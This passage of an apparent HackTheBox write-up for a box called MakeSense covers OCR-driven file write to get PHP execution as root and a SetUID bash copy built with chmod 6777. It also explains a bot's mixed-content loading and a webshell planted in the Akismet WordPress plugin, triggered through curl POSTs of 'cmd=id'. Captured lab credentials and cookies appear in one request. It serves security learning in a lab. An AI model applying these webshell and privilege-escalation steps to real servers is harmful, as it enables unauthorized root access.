l2XULQp1aD73%2FvuDg6NnnNPnND3Oa81EUxQlr7aNcIayVfwON3xkMWe8D4rCBLqWs4pk1KQP7oZ6tlLrTr%2BHblvp80sNQPVMI8blFQU7a7%2Fo3GWOvcoWwdnQzlSSJ%2BwIGVk8AzNldk%2FTMYQPdv%2FOuqio3xgxpxvgPKqWu8Wv7uq6boijQJThcewY5aVdjnDOGLYCPG%2Bf8DqXUY2Y%2FR59XwwDsZXGN0iOHDXR%2FGVie5x%2Bz1l7UvR6In1BK%2Fapf8zdNU2qtsfnKsPxElmU73%2BWyIKfWIS3dw6Nkt8sfR6fekbqu7zDG0HMVAAZjcc3SI4cJ9CiK3p1lGW0Vu6PtvqSd5oqubCiiKLpcSvn62RSg46FD0lq7NbRjJKW8IIqiKzjnz7TWvj%2FP83%2Fdt%2FPAOf9jKeX30te3V5DT7m9FUbyNMfYu9wZsy88opS7zf2NDmEQLMGtxDdMjhwn0LMtORFHkln8NfVxMCHFtHMc%2F4Fc41tq7tda92Zd%2B27IsuyKKon%2FR%2Fb3GmO%2Bvqurj2%2F4cHc7578dx%2FH1xHKvZHcgQ5P0npczjOJ5bFoiudxiaUAPd39KRNuUY9GQyKeWXoih6kh%2FqTdPcVBTFE7qyMVFKfZ1zPrdmmG7eGGOfy%2FP8WV3ZukVRdFUURRfHcXwmXWf0d%2B7VAvehRd5P%2Frwb%2Bn2h6x2GZLUa6BgdpoXuj4k1TXNCaz34pT9ZltHM97P9UK%2Fr%2BnPGmGd3ZWOhlLqec%2F70oRwvBTn90Vq%2FgzH2s0P53COyrOv9fMbYzSM6DzBQIQa6UEoVs4GutX5P0zQ%2F7QoGTEp5Moqih%2FiVTl3Xf2iMeeGAD%2B0w6Gl6N3POE1fSQwjy4UDXOwzZ4ALdWntbnudLt2akSVJSyp1xVco8qkxD25Aly7IqiqK5pWt0nEVR%2FE7TNP%2FYFY7D87Msu2b2ITzHgc7%2FDLrBaqy1J6uq%2BrS19mL3DvQeut5hqHof6GmaPjtN0890J9haeyrP84cuO%2BFZlp2iFmz3OtSJLX6lQ9qbF3pW%2FAdd4YgopWhb32fN9s5sQtfipsurrusTZVn%2BB8bYL3Tvw%2BCh6x0GabM13xokSfJ8IYSbuWytrfI8X%2FrEND%2FomqaZhrq8y19rT9oxP%2BrBuN0VAsCBoOsdhqj3gc4Ye%2FJkMvlid3LbwFo6Y90POa31lU3TvLJ7PQBcCHFjWZY3WmtpTHyuL9fnTwAk3jAD%2Ff89zRjzF3R%2F05YBwD78xgExxuRVVQ1px0kYkSEE%2BiMmk8mJ7jvxwmoO5%2FxDSqmXdK%2F3C%2F8eOk8pdVMX0N24bNvFe6ooirMZY6e9z%2F29Sqk%2F8lvqdV3XRVGcNZlMvsQYo%2F%2Fum4yxp0%2Bn0zvdvwQAe%2Fk5pdQl%2Fg1zqMN4MHwLg7Fv%2FFb3dDqlCWG7WptZlk2jKKId4XYM7Ye36Hnoi8yM4e68pEO11kZeqO9Mfo%2Fj2M0Ab5rmrVrry7rXALC3RV3vpG0s4OE50CtDDXRaF3qTfyb9LrKmaU5rrc9wBT0nhPh6kiRLZ%2FAfVdM0n9Baf58rAIB9SSl3Hm%2FrClp0U12W5amqqpZO0gXYpl0XaR%2F5y7SMMc%2BrquqT%2Fmf1W%2FJa66Et46Lxbh3H8c6DV%2FyuvqNqmuZGrfUFrgAAViKlvDuKokf5Q1tdb1nbcPCHwwC2ar2JsSFKKc05d%2BuMi6J4SV3Xv9e9Jpzzjyilfqh7PcDxc9%2BFQogPR1H0eNo4hSoNqkuOEvJ1Xb%2BvKIqfcgUAcBD%2FXin1Fj%2FUCbrgoQ92XZh9lGXZ%2FVEUuW6tuq5fWxTFr8x%2BVinllB6K0b0e2vj5ATyBc35ZHMfPTZLkLMYYteYX1TFzqMIpy%2FLquq7dpEEAODjqgqc9%2FP3f3M6klbq%2B1xjzSFcIsEV7p0BPKKXu5pz%2Fre7jVFX1NmPMz89%2BvKGPn6%2FbsuVsRVH8p6Zp%2FqUrBIADo6WlcRyf76d6O1mVJsxRAwRd8LBVgwj0LMtui6LonO7M1HV9eVEUb5o9UwvGzz%2FQNM0%2F6l6PkX%2BTQ6jCyfP8iYyxr7lCADiMf6CUutoPddJ2wb%2BXMTZXTwFs0q4LsY%2BUUn%2FJOXeTuaqq%2Bs%2FGmB%2FrXnPOr1VKXdS9DmD8fF3oQTU0%2F8BvRTR5ns%2FtBQ8AhyOEqGKaBr8716nxYYuiGNJeGDBgu6%2FAHlJK%2FTnn%2FBndR7PWfjjP8xd3r6WUNDPcTZoLePz8UBZ1v9d1fUtRFOe5AgA4NM75%2F8my7Ln%2B74xQr1hd17caYx7nCgE2YPfV10NKqf%2FNOX9e99GapvkjrfULutd%2BYIW8f%2FshXZRl2bWz3e9t1zs9me13XCEAHMWFWZZ9yR%2FmIvR7oz9aa2qIfNi9AbBGQwn0j3DOZ5ekfTbP8%2Bd0r%2F1A11pf1TTNj7gCoF6Mj8Vx%2FP2zp6IN9cczxm52hQBwJNQFnyTJwiEt6j2sqooeq3umKwRYk6EE%2BpWcc%2Fec76Zpvqi1fir97yzLiiiKdjZiIW1IDeK4tk1KeSqOY%2FdoWUKr2fI8d%2BcPAI4ujuPfFUK8wp%2B%2F0mmHBf8tY%2BztrhDgiBZebH0jpfylOI5f130ua%2B0teZ7Tg0w%2ByDl%2F2eznxSSUvSmlas75XJ9g0zR3aa0f4woAYC1ofwzOuVrWDV%2FXdWWMWfo4aICDGESgTyaTdzLGLnWfmrFvTKfT85VS98%2FeAbetc1qq9oGuDHah83ajd97If9Nav7wrA4C1uTjLsmsWhTppgx2T5uDIBhHoUsrXxXH8S92HpoeuMMaSKIrczHZS1%2FUXiqL4264AFoqi6HXU6%2BH3BjZN83Na69kbJwBYkzRNP5MkybP26oanVbla659kjP1aVw6wqoUXVt%2FEcfzjUsrf6D4X3dH6vwmsrT4YIcQfJEnyQlfQnteiKC5pmuZdrhAA1mqvdeuddvLcPVVVYRtZWNnyK6pfnjiZTL667CO1E0xoY5mPuULYV5Zl9AQpt6Uuob73uq4vMcbguekAm%2FPOLMsuXdYN32lb7XSj%2FYfW2ovbYoCFhhLoFD51tOTqb5rmL7TWT3MFsDKl1P%2FjnD%2FaFbQt9bIsL6qqCjdIABuUpulfJ0nyLXu11jsU7jTcaIyhR7UC7LL%2FVdQTSqlbOefn%2Bh%2BnaZpGa71wzSesRin1ec753NyDpmmM1npujgIAbEYURb%2BepumPUaNlv3CnG24K96IoaKz9CvcGjN7eV06PCCF%2BO0mSH539SE3TWK31wlY7HIxS6nrO%2BdNdwQMVx5%2Flef5sVwAAGyeEuCWO451tYvcL965Lvmma%2B6qq%2Bq9N07ymfWuXLMvOow26rLU3aK0%2F4d6AYOx9tfRLkmVZ2fW6t5PgMsZY2a%2BPOVxZlv1VFEW0c5zTNM0lWmtMkgPYvucLIWi5m1wy2rgLBXwURfdba0%2FRppmMsW9aayvG2EOjKNrZjKv9987TWt%2FSvYYwDCnQabb7q9M0%2FWXG2Amt9dy4L6yHUuo053zSvW7XyF5ojPlKVwYA28U5%2Fz0hxIsp2Pdrta%2BiaZpXaq2vdAUQhKNfGRCUJEm%2BO03T62YrDWvtJ%2FM8dw%2FHAYBj8xwhxCfiOFb0CQ4b7tba78rz%2FE9cAQThcFcDBE1K%2BYtxHL9p9iCttefmeX67KwCAYxdF0aVJkrwljuMzVwz3P2CMvWM6nf6ZK4FgrHQFwPgopW7nnD%2B2O3Jr7Y%2FkeX7V%2BM4EwCA8SSlFLe6HtvOK7mnH0P%2BGc35%2FVVUfN8a8jzF2%2FyCOBg4FgQ4LSSlfFMfx79P%2Fpgk2VVV9T1mW%2F7d7HwAA%2BgWBDksppd7MOX9KXdeXFUVxo3sDAAB6B4EOAAAQAAQ6AABAABDoAAAAAUCgAwAABACBDgAAEAAEOgAAQAAQ6AAAAAFAoAMAAAQAgQ4AABAABDoAAEAAEOgAAAABQKADAAAEAIEOAAAQAAQ6AABAABDoAAAAAUCgAwAABACBDgAAEAAEOgAAQAAQ6AAAAAFAoAMAAAQAgQ4AABAABDoAAEAAEOgAAAABQKADAAAEAIEOAAAQAAQ6AABAABDoAAAAAUCgAwAABACBDgAAEAAEOgAAQAAQ6AAAAAH4%2F2T1lLkNdhzCAAAAEGRlQkdFNjUyRDI4RTBERTk5RUI4cM1tkQAAAABJRU5ErkJggg%3D%3D
```

The raw image is sent base64-encoded after some metadata. The page in the response has a new form:

```html
<form method="post">
    <p class="caption">Save as</p>
    <input type="hidden" name="ocr_id" value="ocr_6ad7e4d7692326.40812585">
    <div class="save-row">
        <input type="text" name="filename" placeholder="result.txt" required>
        <button type="submit" name="save_output" class="solid-btn">Save</button>
    </div>
</form>
```

Submitting that sends the `ocr_id` along with the new filename:

```yaml
POST / HTTP/1.1
Host: localhost:8001
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:157.0) Gecko/20100101 Firefox/157.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 101
Origin: http://localhost:8001
Authorization: Basic d2FsdGVyOkpiaEhEQUVnWHZyaTMh
Connection: keep-alive
Referer: http://localhost:8001/
Cookie: lang=en-US; username-localhost-8888="2|1:0|10:1790362479|23:username-localhost-8888|192:eyJ1c2VybmFtZSI6ICJkMTJkOThhM2M3MTY0MTUyYjQwYjAyZjhhNTU2MzU5YyIsICJuYW1lIjogIkFub255bW91cyBDYXJtZSIsICJkaXNwbGF5X25hbWUiOiAiQW5vbnltb3VzIENhcm1lIiwgImluaXRpYWxzIjogIkFDIiwgImNvbG9yIjogbnVsbH0=|8cb52a349a5929af9bb334c9483f006f1e1471e19dda498c70ad2dc4e55df48a"; PHPSESSID=kh703rsfk2dgln9808vnsfvceu

ocr_id=ocr_6ad7e4d7692326.40812585&filename=0xdf.txt&save_output=
```

I’ll grab the base64-encoded image from the POST and URL decode and then base64 decode it and take a look:

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/ab24adf65080ed00.png)

![](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/htb-makesense-test-image.webp)

I’ll get the size as well, though the images I send don’t have to be the same dimensions:

```yaml
oxdf@hacky$ exiftool x.png
ExifTool Version Number         : 12.76
File Name                       : x.png
Directory                       : .
File Size                       : 8.2 kB
File Modification Date/Time     : 2026:10:20 22:17:15+00:00
File Access Date/Time           : 2026:10:20 22:17:17+00:00
File Inode Change Date/Time     : 2026:10:20 22:17:15+00:00
File Permissions                : -rwxrwx---
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 500
Image Height                    : 200
Bit Depth                       : 8
Color Type                      : RGB with Alpha
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Image Size                      : 500x200
Megapixels                      : 0.100
```

#### Strategy

I have no idea why a website would ever want to allow a user to create a file with OCR and then save it on the server. Regardless, this is arbitrary file write on the webserver running as root, as long as I can get the OCR to recognize my payload as what I want. I had a similar challenge getting OCR to read a payload in [HTB: Late](https://0xdf.gitlab.io/2022/07/30/htb-late.html).

I don’t have any control over the content other than the original picture submission. So I’ll try to generate an image with a simple PHP file that I can then save as a `.php` file and get execution.

#### Image Generation

I’ll create an image in a simple paint app with a transparent background and black text:

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/d6b21edf47e6e173.png)

![](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/htb-makesense-ocr-test.webp)

My general strategy here is to save this as a file, and then encode it onto my clipboard:

```
oxdf@hacky$ base64 -w0 test.png | xclip -selection c
```

Then I can paste it in after the `,` in Burp Repeater, select it all, and Ctrl-U to URL encode:

![image-20261020182321622](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/0eef625f9ac9b5a9.png)

![image-20261020182321622](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261020182321622.webp)

It works! If something is off, I’ll add some whitespace or move things around a bit to get it where it is recognized.

#### PHP Test

Following that same process, I’ll try a simple POC to show I can run commands with PHP:

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/d605908b565a6478.png)

![](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/htb-makesense-ocr-id.webp)

This image loads as:

![image-20261020195609091](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/0639f1be8ec4f91a.png)

![image-20261020195609091](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261020195609091.webp)

I’ll save it with a `.php` extension:

![image-20261020195316448](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/061636a370429d63.png)

![image-20261020195316448](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261020195316448.webp)

And when I access it over the site, it executes:

```
oxdf@hacky$ curl localhost:8001/saved/id.php
uid=0(root) gid=0(root) groups=0(root)
```

#### Arbitrary Commands

I’ll update this to just run a shell script on the box. This means I can change the contents of the script and get different results:

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/9aa400fe7109d7f1.png)

![](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/df.webp)

I’m aiming for as few characters as possible. After some trial and error, it works:

![image-20261020195928290](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/38ab2a1580b37877.png)

![image-20261020195928290](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261020195928290.webp)

I’ll save it:

![image-20261020195955290](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/157bb39e1ad68e1c.png)

![image-20261020195955290](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20261020195955290.webp)

And create `/tmp/df` (and `chmod +x` it):

```bash
cp /bin/bash /tmp/0xdf
chown root:root /tmp/0xdf
chmod 6777 /tmp/0xdf
```

Now when I hit the saved file, it runs `df`, creating a SetUID / SetGID copy of `bash`:

```ruby
walter@makesense:~$ curl localhost:8001/saved/cmd.php
walter@makesense:~$ ls -l /tmp/0xdf 
-rwsrwsrwx 1 root root 1446024 Oct 21 00:01 /tmp/0xdf
```

I’ll run with `-p` to not drop privs:

```
walter@makesense:~$ /tmp/0xdf -p
0xdf-5.2# 
```

And grab the root flag:

```
0xdf-5.2# cat /root/root.txt
6f99503a************************
```

## Beyond Root

### Mixed Content Bot

I noted above that I should not have been able to load JavaScript from an HTTP site using my XSS because the site was hosted over HTTPS. In general, browsers block this “mixed content”. When I opened the page in my browser, the script was blocked, but for some reason the bot loaded it anyway.

The bot source is located in `/home/admin/.process` as `prey-unified.py`. It has a function, `setup_driver`, that sets up Chrome through Selenium:

```css
def setup_driver():
    chrome_options = Options()

    if HEADLESS:
        chrome_options.add_argument("--headless=new")
        chrome_options.add_argument("--disable-gpu")
        print("[*] Running in headless mode")
    else:
        print("[*] Running in visible mode")

    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--ignore-certificate-errors")
    chrome_options.add_argument("--window-size=1920,1080")
    chrome_options.add_argument("--disable-blink-features=AutomationControlled")

    chrome_options.add_argument("--disable-features=SameSiteByDefaultCookies")
    chrome_options.add_argument("--disable-features=CookiesWithoutSameSiteMustBeSecure")


    chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
    chrome_options.add_experimental_option('useAutomationExtension', False)

    try:
        if USE_MANAGER:
            print("[*] Using webdriver-manager to install ChromeDriver...")
            service = Service(ChromeDriverManager().install())
            driver = webdriver.Chrome(service=service, options=chrome_options)
        else:
            print("[*] Using system ChromeDriver...")
            driver = webdriver.Chrome(options=chrome_options, service=Service("/home/admin/.wdm/drivers/chromedriver/linux64/148.0.7778.178/chromedriver-linux64/chromedriver"))

        driver.set_page_load_timeout(30)
        print(f"[*] ChromeDriver initialized successfully")
        return driver
    except Exception as e:
        print(f"[!] Error setting up driver: {e}")
        print("[!] Make sure Chrome and chromedriver are installed")
        sys.exit(1)
```

There are a lot of arguments / options added here, but none that should allow for mixed content. Chrome’s switch for that is `--allow-running-insecure-content`, or more broadly `--disable-web-security`, and neither is in this list.

I am not able to get a definitive answer on this, but I believe it has to do with Chrome’s [Local Network Access](https://developer.chrome.com/blog/local-network-access):

> Because the local network access permission is restricted to secure contexts, and it can be difficult to migrate local network devices to HTTPS, the permission-gated local network requests will now be exempted from mixed content checks *if* Chrome knows that the requests will be going to the local network before resolving the destination. Chrome knows a request is going to the local network if:
> 
> -   The request hostname is a private IP literal (e.g., `192.168.0.1`).
> -   The request hostname is a `.local` domain.
> -   The `fetch()` call is annotated with the option `targetAddressSpace: "local"`.

When it tries to load a script at `http://10.10.15.169`, that’s a private IP literal, and the mixed content checks are skipped. The permission prompt itself only applies to requests from a public site into the local network, and here the page is already on a private address, so no prompt is needed. The chromedriver path in the bot shows Chrome 148, well past Chrome 141, where Local Network Access [shipped](https://groups.google.com/a/chromium.org/g/blink-dev/c/cwu_RUmBpzY/m/hk8YuZDWHgAJ).

That exception doesn’t apply in Firefox, which is why when I open the page as Jake I get a mixed content block. If I open the admin panel in Chromium, it works!

```
10.10.15.169 - - [21/Oct/2026 21:26:06] code 404, message File not found
10.10.15.169 - - [21/Oct/2026 21:26:06] "GET /form.js HTTP/1.1" 404 -
```

### Modified Plugin Location

When I modify the Akismet plugin to add a webshell, I find it at:

```
https://makesense.htb/main/wp-content/plugins/akismet/akismet.php
```

In [HTB: Spectra](https://0xdf.gitlab.io/2021/06/26/htb-spectra.html#edit-existing-plugin), I describe this path as:

```
[WP root]/wp-content/plugins/[plugin name]/[filename]
```

But what is “WP root”? On MakeSense, WordPress is served from `/`, and there’s no `main` directory on disk:

```ruby
root@makesense:/var/www/html# ls
index.php    scripts          wp-blog-header.php    wp-config-sample.php  wp-includes        wp-login.php     wp-signup.php
license.txt  wp-activate.php  wp-comments-post.php  wp-content            wp-links-opml.php  wp-mail.php      wp-trackback.php
readme.html  wp-admin         wp-config.php         wp-cron.php           wp-load.php        wp-settings.php  xmlrpc.php
```

Requesting the plugin file directly at the path I would expect based on the filesystem returns 403 Forbidden:

```html
oxdf@hacky$ curl https://makesense.htb/wp-content/plugins/akismet/akismet.php -d 'cmd=id' -k
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
<hr>
<address>Apache/2.4.58 (Ubuntu) Server at makesense.htb Port 443</address>
</body></html>
```

That’s because Akismet ships its own `.htaccess` in `/var/www/html/wp-content/plugins/akismet/` that denies access:

```html
# Only allow direct access to specific Web-available files.

# Apache 2.2
<IfModule !mod_authz_core.c>
        Order Deny,Allow
        Deny from all
</IfModule>

# Apache 2.4
<IfModule mod_authz_core.c>
        Require all denied
</IfModule>

# Akismet CSS and JS
<FilesMatch "^(form\.js|akismet(-frontend|-admin)?\.js|akismet(-admin)?(-rtl)?\.css|inter\.css)$">
        <IfModule !mod_authz_core.c>
                Allow from all
        </IfModule>

        <IfModule mod_authz_core.c>
                Require all granted
        </IfModule>
</FilesMatch>

# Akismet images
<FilesMatch "^(logo-a-2x\.png|akismet-refresh-logo\.svg|akismet-refresh-logo@2x\.png|arrow-left\.svg|akismet-activation-banner-elements\.png|copy\.svg)$">
        <IfModule !mod_authz_core.c>
                Allow from all
        </IfModule>

        <IfModule mod_authz_core.c>
                Require all granted
        </IfModule>
</FilesMatch>
```

This denies all requests except a short list of CSS, JS, and image files, and `akismet.php` isn’t on that list.

When requests don’t match up directly to a file, WordPress routes all requests through `/index.php`. That’s why if no 404 page is configured with WordPress, any URL can load the same main page (as is the case on this box).

Loading WordPress through `index.php` includes all the activated plugin files, including `akismet.php`. Once that file is included, it runs, and in this case, returns the command output and exits!

So the path I used previously does work:

```
oxdf@hacky$ curl https://makesense.htb/main/wp-content/plugins/akismet/akismet.php -d 'cmd=id' -k
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

But so does any path:

```kotlin
oxdf@hacky$ curl https://makesense.htb/ -d 'cmd=id' -k
uid=33(www-data) gid=33(www-data) groups=33(www-data)
oxdf@hacky$ curl https://makesense.htb/0xdfwashere -d 'cmd=id' -k
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Even real PHP files that load WordPress on their own, without going through `index.php`, include the plugins and run the webshell:

```
oxdf@hacky$ curl https://makesense.htb/wp-login.php -d 'cmd=id' -k
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

What doesn’t work is a request for a file that Apache serves without loading WordPress, like `/readme.html`, or `akismet.php` itself, which Akismet’s `.htaccess` blocks.
